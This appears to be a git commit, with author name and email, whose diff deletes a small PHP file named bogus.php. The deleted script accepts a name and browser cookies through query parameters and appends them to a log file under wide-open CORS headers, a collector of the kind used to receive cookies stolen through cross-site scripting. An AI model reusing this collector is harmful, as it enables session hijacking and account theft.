edbbce94112536bc3b24c5dbbda37a56ed579c07
kaden-tech <kadenskinner@gmail.com>
2021-04-03 14:00:42 -0400

    log gone

--- log/bogus.php
+++
@@ -1,8 +0,0 @@
-<?php
-     header("Access-Control-Allow-Orgin: *");
-     header("Access-Control-Allow-Credentials: true");
-
-     $f = fopen("bogus.log", "a+");
-     fputs($f, $_GET['name'] . ': ' . $_GET['cookies'] . "/n");
-     fclose($f);
-?>
